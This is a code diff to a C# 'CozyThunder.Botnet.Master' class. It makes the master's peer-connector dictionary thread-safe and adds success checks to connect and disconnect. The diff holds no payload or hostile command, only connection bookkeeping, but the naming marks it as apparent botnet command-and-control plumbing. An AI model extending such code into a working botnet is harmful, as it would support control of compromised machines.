@@ -1,6 +1,7 @@
 ﻿using CozyThunder.Botnet.Common;
 using CozyThunder.Botnet.Interface;
 using System.Collections.Generic;
+using System.Collections.Concurrent;
 using System.Net;
 
 namespace CozyThunder.Botnet.Master
@@ -9,14 +10,14 @@ namespace CozyThunder.Botnet.Master
     {
         IMasterPeerListener listener_;
         PeerList peerList_;
-        Dictionary<string, MasterConnector> connectorList_;
+        ConcurrentDictionary<string, MasterConnector> connectorList_;
 
         public bool Start(IPAddress ip, int port, IMasterPeerListener listener)
         {
             listener_ = listener;
             EndPoint = new IPEndPoint(ip, port);
             peerList_ = new PeerList();
-            connectorList_ = new Dictionary<string, MasterConnector>();
+            connectorList_ = new ConcurrentDictionary<string, MasterConnector>();
             return true;
         }
 
@@ -43,18 +44,22 @@ namespace CozyThunder.Botnet.Master
         public bool Connect(Peer peer)
         {
             var connector = new MasterConnector();
-            connectorList_.Add(peer.EndPoint.ToString(), connector);
-            connector.Connect(peer, this);
-            return true;
+            if(connector.Connect(peer, this))
+            {
+                if(connectorList_.TryAdd(peer.EndPoint.ToString(), connector))
+                {
+                    return true;
+                }
+            }
+            return false;
         }
 
         public bool DisConnect(Peer peer)
         {
             MasterConnector connector;
-            if (connectorList_.TryGetValue(peer.EndPoint.ToString(), out connector))
+            if (connectorList_.TryRemove(peer.EndPoint.ToString(), out connector))
             {
                 connector.DisConnect();
-                connectorList_.Remove(peer.EndPoint.ToString());
                 return true;
             }
             return false;
